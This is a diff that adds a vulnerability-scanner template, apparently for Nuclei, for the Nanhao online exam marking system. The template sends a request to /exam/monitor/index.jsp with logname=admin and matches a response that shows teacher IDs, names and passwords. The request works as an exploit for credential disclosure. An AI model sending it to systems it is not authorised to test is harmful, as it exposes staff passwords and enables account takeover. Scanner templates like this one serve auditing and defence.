@@ -1,0 +1,26 @@
+id: nanhao-logname-Information-disclosure
+
+info:
+  name: 南昊网上阅卷系统 logname 信息泄露漏洞
+  author: nanhao
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /exam/monitor/index.jsp?logname=admin HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '请进行账户信息确认'
+          - '教师ID'
+          - '教师姓名'
+          - '教师密码'
+        condition: and
+      - type: status
+        status: 
+          - 200
